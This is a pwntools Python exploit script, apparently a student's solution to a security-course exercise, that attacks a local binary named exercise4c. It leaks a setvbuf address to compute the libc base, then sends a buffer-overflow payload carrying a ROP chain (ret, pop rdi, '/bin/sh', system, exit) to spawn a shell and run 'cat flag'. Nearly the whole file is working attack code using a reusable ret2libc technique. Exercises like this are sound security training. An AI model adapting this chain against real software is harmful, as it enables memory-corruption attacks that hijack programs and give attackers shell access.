#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise4/exercise4c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
Issue:
- No direct access to "cat flag" string in binary. How can I execute the system('cat flag')? Note: PIE is enabled

Ideas:
- Need to use existing libc functions and ROP gardgets. How is ROP used ?

Workflow:
- Leak phase:
	- send buffer to leak address setvbuf and compute offset of libc in memory
- ROP chain setup:
	- setup the ROP chain -> leaked addresses --> rdi register (first argument x86-64) and ret (returning)
	- locate address of bin/sh => add gadgets to the ROP chain to set rdi to the address of bin/sh  --> system --> exit
- Pyaload crafting 8buffer overflow + pad + ROP chain)
'''

# Insights from Ghidra and GDB analyses
BUFFER_SIZE = 272
LEAK_SIZE = 232
SETVBUF_SIZE = 6
SETVBUF_OFFSET = 261
PADDING_SIZE = 8 

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

r = start()
r.recvline()
r.sendline(b'A'*LEAK_SIZE)

#print(r.recv())

setvbuf_address = int.from_bytes(r.recv()[LEAK_SIZE+4:LEAK_SIZE+4+SETVBUF_SIZE], 'little') - SETVBUF_OFFSET
offset = setvbuf_address - libc.symbols['setvbuf']
libc.address += offset

r.sendline(b'A'*272)

rop = ROP(libc, int.from_bytes(r.recv()[BUFFER_SIZE+4:BUFFER_SIZE+4+SETVBUF_SIZE], 'little')-8)
rop_ret, rop_rdi = rop.ret[0], rop.rdi[0]

#print(hex(rop_ret))
#print(hex(rop_rdi))

rop_bin_sh = next(libc.search(b'/bin/sh\0'))
rop_system_address = libc.symbols['system']
rop_exit_address = libc.symbols['exit']

payload = flat([
	b'A' * BUFFER_SIZE,
	b'B' * PADDING_SIZE,
	p64(rop_ret),
	p64(rop_rdi),
	p64(rop_bin_sh),
	p64(rop_system_address),
	p64(rop_ret),
	p64(rop_exit_address)
]) 

r.sendline(payload)
r.sendline(b'cat flag')
r.sendline(b'exit')

print(r.recvall())
